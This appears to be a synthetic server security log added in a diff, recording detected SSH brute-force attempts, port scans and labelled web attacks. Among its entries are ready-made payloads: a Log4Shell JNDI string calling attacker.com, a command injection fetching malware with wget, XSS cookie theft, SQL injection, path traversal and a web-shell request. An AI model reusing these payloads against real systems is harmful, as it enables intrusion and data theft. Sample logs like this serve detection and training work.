@@ -1,0 +1,47 @@
+2026-07-18 16:10:05 UTC [SSH] [auth] Invalid user admin from 192.168.1.105 port 43220
+2026-07-18 16:10:08 UTC [SSH] [auth] Failed password for root from 192.168.1.105 port 54112
+2026-07-18 16:11:15 UTC [Firewall] [kernel] Nmap scan detected or probe connection refused on port 80 from 10.0.0.42
+2026-07-18 16:10:05 UTC [SSH] [auth] Invalid user admin from 192.168.1.105 port 43220
+2026-07-18 16:10:08 UTC [SSH] [auth] Failed password for root from 192.168.1.105 port 54112
+2026-07-18 16:11:15 UTC [Firewall] [kernel] Nmap scan detected or probe connection refused on port 80 from 10.0.0.42
+2026-07-18 16:00:01 UTC [System] [info] Booting NetGuard V2 Security Core Engine...
+2026-07-18 16:00:03 UTC [System] [info] Initialize network monitoring interface eth0.
+2026-07-18 16:00:05 UTC [System] [info] Firewall policies loaded successfully (34 rules active).
+2026-07-18 16:01:10 UTC [sshd] [info] Server listening on port 22 for incoming connections.
+2026-07-18 16:02:45 UTC [nginx] [info] Web server started: listening on port 80 and 443.
+2026-07-18 16:03:12 UTC [sshd] [info] Connection received from local gateway 192.168.1.1
+2026-07-18 16:05:00 UTC [cron] [info] Started Periodic Command Scheduler (cron job id: 9412).
+2026-07-18 16:05:01 UTC [cron] [info] Finished backup task successfully in 0.42 seconds.
+2026-07-18 16:10:14 UTC [sshd] [info] Connection opened from unknown host: 185.220.101.5
+2026-07-18 16:10:15 UTC [sshd] [warning] Invalid user admin from 185.220.101.5 port 39221
+2026-07-18 16:10:17 UTC [sshd] [warning] Failed password for invalid user admin from 185.220.101.5 port 39221
+2026-07-18 16:10:20 UTC [sshd] [warning] Failed password for invalid user admin from 185.220.101.5 port 39230
+2026-07-18 16:10:22 UTC [sshd] [warning] Failed password for root from 185.220.101.5 port 39242
+2026-07-18 16:10:25 UTC [sshd] [warning] Failed password for root from 185.220.101.5 port 39255
+2026-07-18 16:10:28 UTC [sshd] [warning] Failed password for root from 185.220.101.5 port 39260
+2026-07-18 16:10:31 UTC [sshd] [warning] Failed password for invalid user guest from 185.220.101.5 port 39274
+2026-07-18 16:10:35 UTC [sshd] [warning] Failed password for invalid user support from 185.220.101.5 port 39282
+2026-07-18 16:10:38 UTC [sshd] [warning] Connection closed by authenticating user root 185.220.101.5 [preauth]
+2026-07-18 16:12:01 UTC [System] [info] Internal resource audit log cleared.
+2026-07-18 16:15:22 UTC [kernel] [warning] Netfilter Firewall: Connection refused on port 21 from 45.142.195.12
+2026-07-18 16:15:23 UTC [kernel] [warning] Netfilter Firewall: Connection refused on port 23 from 45.142.195.12
+2026-07-18 16:15:23 UTC [kernel] [warning] Netfilter Firewall: Connection refused on port 25 from 45.142.195.12
+2026-07-18 16:15:24 UTC [kernel] [warning] Netfilter Firewall: Nmap scan detected or probe connection refused on port 80 from 45.142.195.12
+2026-07-18 16:15:25 UTC [kernel] [warning] Netfilter Firewall: Connection refused on port 443 from 45.142.195.12
+2026-07-18 16:15:26 UTC [kernel] [warning] Netfilter Firewall: Connection refused on port 8080 from 45.142.195.12
+2026-07-18 16:20:00 UTC [nginx] [info] HTTP GET /index.html 200 OK - User-Agent: Mozilla/5.0
+2026-07-18 16:22:41 UTC [sshd] [info] Connection opened from authorized developer IP: 192.168.1.50
+2026-07-18 16:22:43 UTC [sshd] [info] Accepted publickey for ayman from 192.168.1.50 port 51042 ssh2: RSA
+2026-07-18 16:50:00 UTC [apache2] Web Shell Attempt: HTTP GET /uploads/shell.php?cmd=whoami 200 OK from 203.0.113.5
+2026-07-18 16:51:22 UTC [nginx] XSS Attack: HTTP GET /search.php?q=<script>alert(document.cookie)</script> 400 from 203.0.113.5
+2026-07-18 16:52:10 UTC [java_app] CVE-2021-44228: Critical exploit try ${jndi:ldap://attacker.com/a} inside User-Agent Header
+2026-07-18 16:53:05 UTC [kernel] Process killed: out of memory (oom-killer) terminated mysql service due to resource stress
+2026-07-18 16:54:14 UTC [systemd] Warning: Cryptomining binary located in /tmp/xmrig connecting to pool stratum+tcp://xmr.pool
+2026-07-18 16:55:01 UTC [nginx] RCE Attempt: HTTP POST /contact.php data="email=test@test.com; wget http://malicious.site/malware"
+2026-07-18 16:40:12 UTC [nginx] Attack pattern matches: HTTP GET /../../etc/passwd 400 Bad Request from 198.51.100.12
+2026-07-18 16:41:05 UTC [mysql] Warning: SQL Injection attempt: HTTP POST /login.php user=' OR 1=1-- from 198.51.100.12
+2026-07-18 16:42:30 UTC [auth] sudo: auth failure ; TTY=pts/1 ; USER=ayman ; COMMAND=/usr/bin/apt update
+2026-07-18 16:22:43 UTC [sshd] [info] pam_unix(sshd:session): session opened for user ayman by (uid=0)
+2026-07-18 16:25:10 UTC [System] [info] Checking storage allocation profiles...
+2026-07-18 16:30:45 UTC [nginx] [warning] Unauthorized access attempt to config file: HTTP GET /www/.env 403 Forbidden from 91.240.118.4
+2026-07-18 16:30:47 UTC [nginx] [warning] Attack pattern detected: HTTP GET /wp-admin/wp-login.php 404 Not Found from 91.240.118.4
